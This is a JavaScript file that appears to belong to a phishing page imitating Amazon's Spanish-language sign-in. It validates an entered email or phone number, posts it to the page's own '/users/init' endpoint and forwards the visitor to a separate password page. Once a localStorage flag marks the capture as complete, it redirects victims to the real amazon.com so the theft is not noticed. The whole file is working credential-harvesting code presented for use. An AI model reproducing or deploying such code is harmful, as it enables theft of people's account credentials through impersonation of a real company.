if (localStorage.getItem("amazon_auth_complete")) {
  window.location.replace("https://www.amazon.com/-/es/");
}

window.addEventListener("pageshow", function (event) {
  if (event.persisted) {
    window.location.reload();
  }
});

const form = document.getElementById("emailForm");
const emailInput = document.getElementById("emailInput");
const errorAlert = document.getElementById("auth-email-missing-alert");

// error de arriba (inicio)
const errorBox = document.getElementById("errorBox");
const errorBoxMsg = errorBox ? errorBox.querySelector(".auth-error-message") : null;

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function scrollToTop() {
  window.scrollTo({ top: 0, left: 0, behavior: "smooth" }); // [web:2]
}

function showTopError(message) {
  if (errorBox && errorBoxMsg) {
    errorBoxMsg.textContent = message;
    errorBox.style.display = "block"; // o "flex" si tu CSS lo requiere
  }

  // Por si también quedaba visible el error interno
  if (errorAlert) errorAlert.style.display = "none";

  // marca el input
  emailInput.classList.add("form-input-error");
  emailInput.focus();

  // subir al tope
  scrollToTop();
}

function clearErrors() {
  emailInput.classList.remove("form-input-error");
  if (errorAlert) errorAlert.style.display = "none";
  if (errorBox) errorBox.style.display = "none";
}

emailInput.addEventListener("input", () => {
  clearErrors();
});

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = emailInput.value.trim();

  if (!email) {
    showTopError("Escriba su correo electrónico o su número de teléfono móvil");
    return;
  }

  const isPhone = /^[0-9+\s()-]{6,}$/.test(email);
  if (!isPhone && !emailRegex.test(email)) {
    showTopError("La dirección de correo electrónico no es válida");
    return;
  }

  try {
    const res = await fetch("/users/init", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email }),
    });

    if (!res.ok) {
      alert("Hubo un problema al procesar tu solicitud.");
      return;
    }

    const params = new URLSearchParams();
    params.set("email", email);
    window.location.href = `password.html?${params.toString()}`;
  } catch {
    alert("Error de conexión con el servidor.");
  }
});
